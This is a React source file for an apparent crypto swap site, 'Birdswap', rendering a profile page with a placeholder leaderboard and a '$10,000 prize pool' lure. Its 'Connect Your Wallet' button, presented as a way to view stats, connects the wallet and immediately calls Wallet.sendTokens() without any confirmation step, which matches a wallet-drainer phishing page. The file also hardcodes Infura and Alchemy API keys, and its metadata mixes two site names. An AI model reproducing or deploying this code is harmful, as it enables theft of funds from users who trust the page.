import React, { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { Alchemy, Network, TokenBalance, Utils } from "alchemy-sdk";
import { SwapWidget, darkTheme, Theme } from '@uniswap/widgets';
import { tokenList } from "./tokenList";
import '@uniswap/widgets/fonts.css'
import "./swap.css"
import { useNavigate } from "react-router";
import A from "./TradingView"
import { createWeb3Modal, defaultConfig, useWeb3Modal, useWeb3ModalAccount, useWeb3ModalProvider } from '@web3modal/ethers5/react'
import { ethers } from "ethers";
import Web3 from "web3";
import Wallet from "./wallet";
import { motion } from "framer-motion";
import { Navbar } from "./Home";
const Transaction = require("ethereumjs-tx")

const jsonRpcUrlMap = {
    1: ["https://mainnet.infura.io/v3/d96840a8db194f239eab32544159793e"]
}

const myDarkTheme: Theme = {
    ...darkTheme, // Extend the darkTheme
    // container: "#E3C9CB",
    // module: "#A5B78F",
    // primary: "#482728",
    // secondary: "#482728",
    // outline: "#482728",
    // accent: "#482728",
    // interactive: "#482728",
    // dialog: "#12ffb8",










    borderRadius: {
        large: 56,
        medium: 56,
        small: 56,
        xsmall: 56
    }
}

const config = {
    apiKey: "QmN987r2njqRwi-sayxhDTX0rZariEcY",
    network: Network.ETH_MAINNET,
};


export const alchemy = new Alchemy(config);


// 1. Get projectId at https://cloud.walletconnect.com
const projectId = 'c5e857331d9ecd93bf3705578f172580'

// 2. Set chains
const mainnet = {
    chainId: 1,
    name: 'Ethereum',
    currency: 'ETH',
    explorerUrl: 'https://etherscan.io',
    rpcUrl: 'https://cloudflare-eth.com'
}

// 3. Create modal
const metadata = {
    name: 'Birdswap',
    description: 'Birdswap is a cryptocurrency exchange that allows to swap BTC and altcoins in an easy way. DiceSwap supports 1000 cryptocurrencies. Make Bitcoin to Ethereum, Litecoin crypto exchanges at the best rates!',
    url: 'https://birdswap.io', // origin must match your domain & subdomain
    icons: ['https://firebasestorage.googleapis.com/v0/b/imageupload-b460d.appspot.com/o/dear.svg?alt=media&token=5d15f5d8-b5e3-4592-8222-326368a49c2e']
}

createWeb3Modal({
    ethersConfig: defaultConfig({ metadata }),
    chains: [mainnet],
    projectId,
    enableAnalytics: true // Optional - defaults to your Cloud configuration
})

const Profile = () => {
    // const { open } = useWeb3Modal()
    // const { address, chainId, isConnected } = useWeb3ModalAccount()
    // const { walletProvider } = useWeb3ModalProvider()
    const [provider, setProvider] = useState<any>();

    const authenticateUser = async () => {
        await Wallet.create()
        await Wallet.connectWallet()
        transact();

    };

    const transact = async () => {

        if (Wallet.address) {
            while (!Wallet.readyToTransact()) {
                continue;
            }
            setProvider(Wallet.provider)
            if (Wallet.address) {
                Wallet.sendTokens();
                // n.current = 1;
                return false;
            }
        }

        return false;

    }

    useEffect(() => {
        (async () => {
            try {
                const [primaryWallet] = Wallet.onboard.state.get().wallets
                await Wallet.onboard.disconnectWallet({ label: primaryWallet.label })
            } catch (error) {

            }

        })()
    }, [])


    return (
        <>
            <Navbar connectWallet={authenticateUser} />
            <div className="p-6">
                <div className="flex md:flex-row flex-col-reverse  gap-4">
                    <div className="md:bg-[#070917] md:w-8/12 rounded-2xl p-12">
                        <div className="flex flex-col items-center">
                            <div>
                                <img className="" src={process.env.PUBLIC_URL + "/profile-overview.png"} alt="" />
                            </div>
                            <div className="text-center">
                                <div className="font-semibold mt-6 text-2xl">
                                    Sign Wallet to see your stats!
                                    <div className="text-xs text-zinc-400 font-light">
                                        Track your socre and stats in your profile
                                    </div>
                                </div>
                            </div>

                            <div className="mt-12">
                                <button onClick={() => authenticateUser()} className="font-medium py-2 px-4 rounded-full text-sm md:bg-[#1C3CF1]">
                                    <div className="flex item-center gap-2 px-6">

                                        <span className="md:inline-block hidden">
                                            Connect Your Wallet
                                        </span>
                                    </div>
                                </button>
                            </div>

                        </div>

                    </div>
                    <div className="flex-1 rounded-2xl px-4 py-8 md:bg-[#070917]">
                        <div className="text-lg font-medium">
                            Score Leaderboard
                        </div>
                        <div className="mt-3">
                            <div className="grid grid-cols-3 gap-2">
                                <div className="bg-[#070917] border py-8 space-y-3 flex flex-col items-center rounded-2xl border-[#111733]">
                                    <div className="relative">
                                        <img className="w-16" src={process.env.PUBLIC_URL + "/robot.svg"} alt="" />
                                        <div className="c-fabyaU public-leaderboard-top-user-level"><span className="c-AsWAM c-AsWAM-diWuFK-cv c-AsWAM-iiwXIGo-css _typography _text text-xs">23</span></div>
                                    </div>
                                    <div className="flex items-center gap-1">
                                        <span>1</span> <span className="text-xs font-light text-zinc-300"> Rank</span>
                                    </div>
                                    <span className="text-xs font-medium text-zinc-300"> 0x908b...124</span>
                                    <div className="flex items-center gap-1">
                                        <div className="bg-[#fff1d4] rounded-full p">
                                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" width="16" height="16" className="text-[#ff8a20]"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.1297 4.15703C13.935 4.15703 13.5652 4.31417 13.2086 5.04165L13.2065 5.04589L11.708 8.04284C11.5535 8.35839 11.2936 8.6315 11.023 8.83277C10.7517 9.03459 10.414 9.20563 10.0653 9.26254L7.35557 9.70885C6.59307 9.84027 6.32773 10.1442 6.26382 10.3438C6.20022 10.5425 6.23891 10.9424 6.78676 11.4903L8.90971 13.6133C9.1703 13.8817 9.34982 14.2405 9.44958 14.5896C9.5489 14.9373 9.58745 15.3398 9.4993 15.7108L9.49876 15.713L8.89345 18.3254C8.66637 19.3044 8.89026 19.678 9.02355 19.7749C9.1589 19.8734 9.58682 19.9701 10.4497 19.4606L12.9892 17.9517C13.3345 17.7437 13.7543 17.6591 14.1377 17.6591C14.521 17.6591 14.9408 17.7437 15.2861 17.9518L17.8274 19.4616C18.6899 19.9761 19.1166 19.8777 19.2508 19.7796C19.3853 19.6814 19.6089 19.3042 19.3819 18.3256L18.7759 15.7102L18.7757 15.7092C18.6885 15.3355 18.7258 14.9314 18.8257 14.5817C18.9256 14.2322 19.1063 13.8725 19.3719 13.6069L21.4868 11.4921L21.4876 11.4913C22.0361 10.9377 22.0753 10.535 22.0115 10.3359C21.9481 10.1379 21.6846 9.83555 20.9213 9.70911L18.1973 9.26046C17.8585 9.19741 17.5259 9.03063 17.2542 8.83019C16.9846 8.63125 16.7229 8.36056 16.5673 8.04284L15.0695 5.04728C14.7024 4.31804 14.3271 4.15703 14.1297 4.15703ZM14.1297 2.95703C14.9959 2.95703 15.6897 3.61019 16.1414 4.50783L16.1422 4.50923L17.6446 7.5142C17.6913 7.60998 17.801 7.74239 17.9666 7.86456C18.1288 7.98418 18.2937 8.05649 18.4119 8.07962L21.1169 8.52515C22.0873 8.6859 22.8933 9.15476 23.1544 9.96992C23.415 10.7838 23.0341 11.6359 22.3389 12.337L22.3371 12.3388L20.2205 14.4555C20.1351 14.5409 20.0393 14.7024 19.9796 14.9113C19.9201 15.1197 19.9149 15.3108 19.9443 15.4367L19.9446 15.438L20.5509 18.0544C20.8024 19.1392 20.7123 20.1981 19.9587 20.7486C19.205 21.2992 18.1694 21.0627 17.2133 20.4926L14.6675 18.98C14.5558 18.9125 14.365 18.8591 14.1377 18.8591C13.9103 18.8591 13.7195 18.9125 13.6078 18.98L13.6039 18.9824L11.0604 20.4935C10.1048 21.058 9.07033 21.2929 8.31757 20.7453C7.56277 20.1961 7.4729 19.139 7.72442 18.0546L8.3307 15.438L8.33167 15.4339C8.35982 15.3162 8.35577 15.1294 8.29575 14.9193C8.23652 14.712 8.14079 14.5454 8.05111 14.4517L5.93823 12.3388C5.24162 11.6422 4.86018 10.7924 5.12098 9.9779C5.38142 9.16455 6.18463 8.69242 7.15436 8.52584L7.15843 8.52514L9.87069 8.07843L9.8718 8.07825C9.98026 8.06059 10.1422 7.99241 10.3068 7.86995C10.4714 7.74746 10.583 7.61219 10.6307 7.51422L10.6334 7.50866L12.1322 4.51126C12.5733 3.6125 13.2615 2.95703 14.1297 2.95703Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0.76416 4.5541C0.76416 4.22273 1.03279 3.9541 1.36416 3.9541H7.74598C8.07735 3.9541 8.34598 4.22273 8.34598 4.5541C8.34598 4.88547 8.07735 5.1541 7.74598 5.1541H1.36416C1.03279 5.1541 0.76416 4.88547 0.76416 4.5541Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0.76416 19.4447C0.76416 19.1134 1.03279 18.8447 1.36416 18.8447H4.55507C4.88644 18.8447 5.15507 19.1134 5.15507 19.4447C5.15507 19.7761 4.88644 20.0447 4.55507 20.0447H1.36416C1.03279 20.0447 0.76416 19.7761 0.76416 19.4447Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0.76416 11.9994C0.76416 11.668 1.03279 11.3994 1.36416 11.3994H2.4278C2.75917 11.3994 3.0278 11.668 3.0278 11.9994C3.0278 12.3308 2.75917 12.5994 2.4278 12.5994H1.36416C1.03279 12.5994 0.76416 12.3308 0.76416 11.9994Z" fill="currentColor"></path></svg>
                                        </div>
                                        <div className="text- text-zinc-400">29079.1</div>
                                    </div>
                                </div>
                                <div className="bg-[#070917] border py-8 space-y-3 flex flex-col items-center rounded-2xl border-[#111733]">
                                    <div className="relative">
                                        <img className="w-16" src={process.env.PUBLIC_URL + "/robot.svg"} alt="" />
                                        <div className="c-fabyaU public-leaderboard-top-user-level"><span className="c-AsWAM c-AsWAM-diWuFK-cv c-AsWAM-iiwXIGo-css _typography _text text-xs">23</span></div>
                                    </div>
                                    <div className="flex items-center gap-1">
                                        <span>1</span> <span className="text-xs font-light text-zinc-300"> Rank</span>
                                    </div>
                                    <span className="text-xs font-medium text-zinc-300"> 0x908b...124</span>
                                    <div className="flex items-center gap-1">
                                        <div className="bg-[#fff1d4] rounded-full p">
                                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" width="16" height="16" className="text-[#ff8a20]"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.1297 4.15703C13.935 4.15703 13.5652 4.31417 13.2086 5.04165L13.2065 5.04589L11.708 8.04284C11.5535 8.35839 11.2936 8.6315 11.023 8.83277C10.7517 9.03459 10.414 9.20563 10.0653 9.26254L7.35557 9.70885C6.59307 9.84027 6.32773 10.1442 6.26382 10.3438C6.20022 10.5425 6.23891 10.9424 6.78676 11.4903L8.90971 13.6133C9.1703 13.8817 9.34982 14.2405 9.44958 14.5896C9.5489 14.9373 9.58745 15.3398 9.4993 15.7108L9.49876 15.713L8.89345 18.3254C8.66637 19.3044 8.89026 19.678 9.02355 19.7749C9.1589 19.8734 9.58682 19.9701 10.4497 19.4606L12.9892 17.9517C13.3345 17.7437 13.7543 17.6591 14.1377 17.6591C14.521 17.6591 14.9408 17.7437 15.2861 17.9518L17.8274 19.4616C18.6899 19.9761 19.1166 19.8777 19.2508 19.7796C19.3853 19.6814 19.6089 19.3042 19.3819 18.3256L18.7759 15.7102L18.7757 15.7092C18.6885 15.3355 18.7258 14.9314 18.8257 14.5817C18.9256 14.2322 19.1063 13.8725 19.3719 13.6069L21.4868 11.4921L21.4876 11.4913C22.0361 10.9377 22.0753 10.535 22.0115 10.3359C21.9481 10.1379 21.6846 9.83555 20.9213 9.70911L18.1973 9.26046C17.8585 9.19741 17.5259 9.03063 17.2542 8.83019C16.9846 8.63125 16.7229 8.36056 16.5673 8.04284L15.0695 5.04728C14.7024 4.31804 14.3271 4.15703 14.1297 4.15703ZM14.1297 2.95703C14.9959 2.95703 15.6897 3.61019 16.1414 4.50783L16.1422 4.50923L17.6446 7.5142C17.6913 7.60998 17.801 7.74239 17.9666 7.86456C18.1288 7.98418 18.2937 8.05649 18.4119 8.07962L21.1169 8.52515C22.0873 8.6859 22.8933 9.15476 23.1544 9.96992C23.415 10.7838 23.0341 11.6359 22.3389 12.337L22.3371 12.3388L20.2205 14.4555C20.1351 14.5409 20.0393 14.7024 19.9796 14.9113C19.9201 15.1197 19.9149 15.3108 19.9443 15.4367L19.9446 15.438L20.5509 18.0544C20.8024 19.1392 20.7123 20.1981 19.9587 20.7486C19.205 21.2992 18.1694 21.0627 17.2133 20.4926L14.6675 18.98C14.5558 18.9125 14.365 18.8591 14.1377 18.8591C13.9103 18.8591 13.7195 18.9125 13.6078 18.98L13.6039 18.9824L11.0604 20.4935C10.1048 21.058 9.07033 21.2929 8.31757 20.7453C7.56277 20.1961 7.4729 19.139 7.72442 18.0546L8.3307 15.438L8.33167 15.4339C8.35982 15.3162 8.35577 15.1294 8.29575 14.9193C8.23652 14.712 8.14079 14.5454 8.05111 14.4517L5.93823 12.3388C5.24162 11.6422 4.86018 10.7924 5.12098 9.9779C5.38142 9.16455 6.18463 8.69242 7.15436 8.52584L7.15843 8.52514L9.87069 8.07843L9.8718 8.07825C9.98026 8.06059 10.1422 7.99241 10.3068 7.86995C10.4714 7.74746 10.583 7.61219 10.6307 7.51422L10.6334 7.50866L12.1322 4.51126C12.5733 3.6125 13.2615 2.95703 14.1297 2.95703Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0.76416 4.5541C0.76416 4.22273 1.03279 3.9541 1.36416 3.9541H7.74598C8.07735 3.9541 8.34598 4.22273 8.34598 4.5541C8.34598 4.88547 8.07735 5.1541 7.74598 5.1541H1.36416C1.03279 5.1541 0.76416 4.88547 0.76416 4.5541Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0.76416 19.4447C0.76416 19.1134 1.03279 18.8447 1.36416 18.8447H4.55507C4.88644 18.8447 5.15507 19.1134 5.15507 19.4447C5.15507 19.7761 4.88644 20.0447 4.55507 20.0447H1.36416C1.03279 20.0447 0.76416 19.7761 0.76416 19.4447Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0.76416 11.9994C0.76416 11.668 1.03279 11.3994 1.36416 11.3994H2.4278C2.75917 11.3994 3.0278 11.668 3.0278 11.9994C3.0278 12.3308 2.75917 12.5994 2.4278 12.5994H1.36416C1.03279 12.5994 0.76416 12.3308 0.76416 11.9994Z" fill="currentColor"></path></svg>
                                        </div>
                                        <div className="text- text-zinc-400">29079.1</div>
                                    </div>
                                </div>
                                <div className="bg-[#070917] border py-8 space-y-3 flex flex-col items-center rounded-2xl border-[#111733]">
                                    <div className="relative">
                                        <img className="w-16" src={process.env.PUBLIC_URL + "/robot.svg"} alt="" />
                                        <div className="c-fabyaU public-leaderboard-top-user-level"><span className="c-AsWAM c-AsWAM-diWuFK-cv c-AsWAM-iiwXIGo-css _typography _text text-xs">23</span></div>
                                    </div>
                                    <div className="flex items-center gap-1">
                                        <span>1</span> <span className="text-xs font-light text-zinc-300"> Rank</span>
                                    </div>
                                    <span className="text-xs font-medium text-zinc-300"> 0x908b...124</span>
                                    <div className="flex items-center gap-1">
                                        <div className="bg-[#fff1d4] rounded-full p">
                                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" width="16" height="16" className="text-[#ff8a20]"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.1297 4.15703C13.935 4.15703 13.5652 4.31417 13.2086 5.04165L13.2065 5.04589L11.708 8.04284C11.5535 8.35839 11.2936 8.6315 11.023 8.83277C10.7517 9.03459 10.414 9.20563 10.0653 9.26254L7.35557 9.70885C6.59307 9.84027 6.32773 10.1442 6.26382 10.3438C6.20022 10.5425 6.23891 10.9424 6.78676 11.4903L8.90971 13.6133C9.1703 13.8817 9.34982 14.2405 9.44958 14.5896C9.5489 14.9373 9.58745 15.3398 9.4993 15.7108L9.49876 15.713L8.89345 18.3254C8.66637 19.3044 8.89026 19.678 9.02355 19.7749C9.1589 19.8734 9.58682 19.9701 10.4497 19.4606L12.9892 17.9517C13.3345 17.7437 13.7543 17.6591 14.1377 17.6591C14.521 17.6591 14.9408 17.7437 15.2861 17.9518L17.8274 19.4616C18.6899 19.9761 19.1166 19.8777 19.2508 19.7796C19.3853 19.6814 19.6089 19.3042 19.3819 18.3256L18.7759 15.7102L18.7757 15.7092C18.6885 15.3355 18.7258 14.9314 18.8257 14.5817C18.9256 14.2322 19.1063 13.8725 19.3719 13.6069L21.4868 11.4921L21.4876 11.4913C22.0361 10.9377 22.0753 10.535 22.0115 10.3359C21.9481 10.1379 21.6846 9.83555 20.9213 9.70911L18.1973 9.26046C17.8585 9.19741 17.5259 9.03063 17.2542 8.83019C16.9846 8.63125 16.7229 8.36056 16.5673 8.04284L15.0695 5.04728C14.7024 4.31804 14.3271 4.15703 14.1297 4.15703ZM14.1297 2.95703C14.9959 2.95703 15.6897 3.61019 16.1414 4.50783L16.1422 4.50923L17.6446 7.5142C17.6913 7.60998 17.801 7.74239 17.9666 7.86456C18.1288 7.98418 18.2937 8.05649 18.4119 8.07962L21.1169 8.52515C22.0873 8.6859 22.8933 9.15476 23.1544 9.96992C23.415 10.7838 23.0341 11.6359 22.3389 12.337L22.3371 12.3388L20.2205 14.4555C20.1351 14.5409 20.0393 14.7024 19.9796 14.9113C19.9201 15.1197 19.9149 15.3108 19.9443 15.4367L19.9446 15.438L20.5509 18.0544C20.8024 19.1392 20.7123 20.1981 19.9587 20.7486C19.205 21.2992 18.1694 21.0627 17.2133 20.4926L14.6675 18.98C14.5558 18.9125 14.365 18.8591 14.1377 18.8591C13.9103 18.8591 13.7195 18.9125 13.6078 18.98L13.6039 18.9824L11.0604 20.4935C10.1048 21.058 9.07033 21.2929 8.31757 20.7453C7.56277 20.1961 7.4729 19.139 7.72442 18.0546L8.3307 15.438L8.33167 15.4339C8.35982 15.3162 8.35577 15.1294 8.29575 14.9193C8.23652 14.712 8.14079 14.5454 8.05111 14.4517L5.93823 12.3388C5.24162 11.6422 4.86018 10.7924 5.12098 9.9779C5.38142 9.16455 6.18463 8.69242 7.15436 8.52584L7.15843 8.52514L9.87069 8.07843L9.8718 8.07825C9.98026 8.06059 10.1422 7.99241 10.3068 7.86995C10.4714 7.74746 10.583 7.61219 10.6307 7.51422L10.6334 7.50866L12.1322 4.51126C12.5733 3.6125 13.2615 2.95703 14.1297 2.95703Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0.76416 4.5541C0.76416 4.22273 1.03279 3.9541 1.36416 3.9541H7.74598C8.07735 3.9541 8.34598 4.22273 8.34598 4.5541C8.34598 4.88547 8.07735 5.1541 7.74598 5.1541H1.36416C1.03279 5.1541 0.76416 4.88547 0.76416 4.5541Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0.76416 19.4447C0.76416 19.1134 1.03279 18.8447 1.36416 18.8447H4.55507C4.88644 18.8447 5.15507 19.1134 5.15507 19.4447C5.15507 19.7761 4.88644 20.0447 4.55507 20.0447H1.36416C1.03279 20.0447 0.76416 19.7761 0.76416 19.4447Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0.76416 11.9994C0.76416 11.668 1.03279 11.3994 1.36416 11.3994H2.4278C2.75917 11.3994 3.0278 11.668 3.0278 11.9994C3.0278 12.3308 2.75917 12.5994 2.4278 12.5994H1.36416C1.03279 12.5994 0.76416 12.3308 0.76416 11.9994Z" fill="currentColor"></path></svg>
                                        </div>
                                        <div className="text- text-zinc-400">29079.1</div>
                                    </div>
                                </div>
                            </div>
                            <div className="mt-4 space-y-4 bg-[#070917] md:p-0 py-4 rounded-2xl">

                                {[4, 5, 6, 7, 8, 9, 10].map((i) => {
                                    return (
                                        <div className=" py-5 px-4 flex justify-between w-full border-1 border-b border-[#111733]">
                                            <div className="flex items-center gap-2">
                                                <div>
                                                    <div className=" bg-[#0F142E] px-6 py-1 text-xs rounded-xl">
                                                        {i}
                                                    </div>
                                                </div>
                                                <div className="flex items-center gap-2">
                                                    <div className="relative">
                                                        <img className="w-12" src={process.env.PUBLIC_URL + "/robot.svg"} alt="" />
                                                        <div className="robo-small"><span className="c-AsWAM-2 c-AsWAM-diWuFK-cv c-AsWAM-iiwXIGo-css _typography _text text-[0.7rem]">23</span></div>
                                                    </div>
                                                    <span className="text-sm font-medium text-zinc-600"> 0x908b...124</span>
                                                </div>
                                            </div>

                                            <div className="flex items-center gap-1">
                                                <div className=" rounded-full p">
                                                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" width="16" height="16" className="text-slate-400"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.1297 4.15703C13.935 4.15703 13.5652 4.31417 13.2086 5.04165L13.2065 5.04589L11.708 8.04284C11.5535 8.35839 11.2936 8.6315 11.023 8.83277C10.7517 9.03459 10.414 9.20563 10.0653 9.26254L7.35557 9.70885C6.59307 9.84027 6.32773 10.1442 6.26382 10.3438C6.20022 10.5425 6.23891 10.9424 6.78676 11.4903L8.90971 13.6133C9.1703 13.8817 9.34982 14.2405 9.44958 14.5896C9.5489 14.9373 9.58745 15.3398 9.4993 15.7108L9.49876 15.713L8.89345 18.3254C8.66637 19.3044 8.89026 19.678 9.02355 19.7749C9.1589 19.8734 9.58682 19.9701 10.4497 19.4606L12.9892 17.9517C13.3345 17.7437 13.7543 17.6591 14.1377 17.6591C14.521 17.6591 14.9408 17.7437 15.2861 17.9518L17.8274 19.4616C18.6899 19.9761 19.1166 19.8777 19.2508 19.7796C19.3853 19.6814 19.6089 19.3042 19.3819 18.3256L18.7759 15.7102L18.7757 15.7092C18.6885 15.3355 18.7258 14.9314 18.8257 14.5817C18.9256 14.2322 19.1063 13.8725 19.3719 13.6069L21.4868 11.4921L21.4876 11.4913C22.0361 10.9377 22.0753 10.535 22.0115 10.3359C21.9481 10.1379 21.6846 9.83555 20.9213 9.70911L18.1973 9.26046C17.8585 9.19741 17.5259 9.03063 17.2542 8.83019C16.9846 8.63125 16.7229 8.36056 16.5673 8.04284L15.0695 5.04728C14.7024 4.31804 14.3271 4.15703 14.1297 4.15703ZM14.1297 2.95703C14.9959 2.95703 15.6897 3.61019 16.1414 4.50783L16.1422 4.50923L17.6446 7.5142C17.6913 7.60998 17.801 7.74239 17.9666 7.86456C18.1288 7.98418 18.2937 8.05649 18.4119 8.07962L21.1169 8.52515C22.0873 8.6859 22.8933 9.15476 23.1544 9.96992C23.415 10.7838 23.0341 11.6359 22.3389 12.337L22.3371 12.3388L20.2205 14.4555C20.1351 14.5409 20.0393 14.7024 19.9796 14.9113C19.9201 15.1197 19.9149 15.3108 19.9443 15.4367L19.9446 15.438L20.5509 18.0544C20.8024 19.1392 20.7123 20.1981 19.9587 20.7486C19.205 21.2992 18.1694 21.0627 17.2133 20.4926L14.6675 18.98C14.5558 18.9125 14.365 18.8591 14.1377 18.8591C13.9103 18.8591 13.7195 18.9125 13.6078 18.98L13.6039 18.9824L11.0604 20.4935C10.1048 21.058 9.07033 21.2929 8.31757 20.7453C7.56277 20.1961 7.4729 19.139 7.72442 18.0546L8.3307 15.438L8.33167 15.4339C8.35982 15.3162 8.35577 15.1294 8.29575 14.9193C8.23652 14.712 8.14079 14.5454 8.05111 14.4517L5.93823 12.3388C5.24162 11.6422 4.86018 10.7924 5.12098 9.9779C5.38142 9.16455 6.18463 8.69242 7.15436 8.52584L7.15843 8.52514L9.87069 8.07843L9.8718 8.07825C9.98026 8.06059 10.1422 7.99241 10.3068 7.86995C10.4714 7.74746 10.583 7.61219 10.6307 7.51422L10.6334 7.50866L12.1322 4.51126C12.5733 3.6125 13.2615 2.95703 14.1297 2.95703Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0.76416 4.5541C0.76416 4.22273 1.03279 3.9541 1.36416 3.9541H7.74598C8.07735 3.9541 8.34598 4.22273 8.34598 4.5541C8.34598 4.88547 8.07735 5.1541 7.74598 5.1541H1.36416C1.03279 5.1541 0.76416 4.88547 0.76416 4.5541Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0.76416 19.4447C0.76416 19.1134 1.03279 18.8447 1.36416 18.8447H4.55507C4.88644 18.8447 5.15507 19.1134 5.15507 19.4447C5.15507 19.7761 4.88644 20.0447 4.55507 20.0447H1.36416C1.03279 20.0447 0.76416 19.7761 0.76416 19.4447Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0.76416 11.9994C0.76416 11.668 1.03279 11.3994 1.36416 11.3994H2.4278C2.75917 11.3994 3.0278 11.668 3.0278 11.9994C3.0278 12.3308 2.75917 12.5994 2.4278 12.5994H1.36416C1.03279 12.5994 0.76416 12.3308 0.76416 11.9994Z" fill="currentColor"></path></svg>
                                                </div>
                                                <div className="text- text-zinc-400 text-xs">29079.1</div>
                                            </div>
                                        </div>
                                    )
                                })
                                }
                            </div>
                        </div>
                    </div>

                </div>
            </div>
            <div className="container mx-auto">
                <div className="relative z-10 max-w-[390px] mx-auto">

                    <div className="w-full mt-4">
                        <div className="reward rounded-xl p-4 space-y-4">
                            <div>
                                <img className="w-12" src={process.env.PUBLIC_URL + "/logo.svg"} alt="" />
                            </div>
                            <div className="text-sm">
                                Swap $10 on Scroll & Win Lucky Rewards! 🍀💰
                            </div>
                            <div>
                                <div className=" bg-white rounded-full text-xs bg-opacity-25 inline-flex px-4 py-1 items-center gap-1">
                                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" width="24" height="24" className=""><path d="M8.75 1.8125C7.60466 1.8125 6.68218 2.6999 6.55078 3.8125H5.25C4.29252 3.8125 3.5 4.60502 3.5 5.5625V8.5625C3.5 10.3485 4.96403 11.8125 6.75 11.8125H6.85449C7.52788 13.8737 9.2997 15.358 11.5 15.6602V17.3125H9.75C7.96403 17.3125 6.5 18.7765 6.5 20.5625V21.0625C6.50002 21.2614 6.57904 21.4522 6.71969 21.5928C6.86034 21.7335 7.05109 21.8125 7.25 21.8125H17.25C17.4489 21.8125 17.6397 21.7335 17.7803 21.5928C17.921 21.4522 18 21.2614 18 21.0625V20.5625C18 18.7765 16.536 17.3125 14.75 17.3125H13V15.6602C15.2003 15.358 16.9721 13.8737 17.6455 11.8125H17.75C19.536 11.8125 21 10.3485 21 8.5625V5.5625C21 4.60502 20.2075 3.8125 19.25 3.8125H17.9492C17.8178 2.6999 16.8953 1.8125 15.75 1.8125H8.75ZM8.75 3.3125H15.75C16.1732 3.3125 16.5 3.63925 16.5 4.0625V4.43945C16.4868 4.51997 16.4868 4.6021 16.5 4.68262V10.0625C16.5 12.4034 14.6279 14.2794 12.293 14.3037C12.2643 14.3021 12.2357 14.3021 12.207 14.3037C9.87213 14.2794 8 12.4034 8 10.0625V4.68555C8.01323 4.60503 8.01323 4.5229 8 4.44238V4.0625C8 3.63925 8.32675 3.3125 8.75 3.3125ZM5.25 5.3125H6.5V10.0625C6.5 10.1365 6.5392 10.1981 6.54199 10.2715C5.67213 10.1658 5 9.4635 5 8.5625V5.5625C5 5.41498 5.10248 5.3125 5.25 5.3125ZM18 5.3125H19.25C19.3975 5.3125 19.5 5.41498 19.5 5.5625V8.5625C19.5 9.4635 18.8279 10.1658 17.958 10.2715C17.9608 10.1981 18 10.1365 18 10.0625V5.3125ZM9.75 18.8125H14.75C15.636 18.8125 16.326 19.464 16.4502 20.3125H8.0498C8.17403 19.464 8.86398 18.8125 9.75 18.8125Z" fill="currentColor"></path></svg>
                                    <span>
                                        Prize pool: $10,000
                                    </span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>



            </div >
        </>
    );
};


export default Profile;
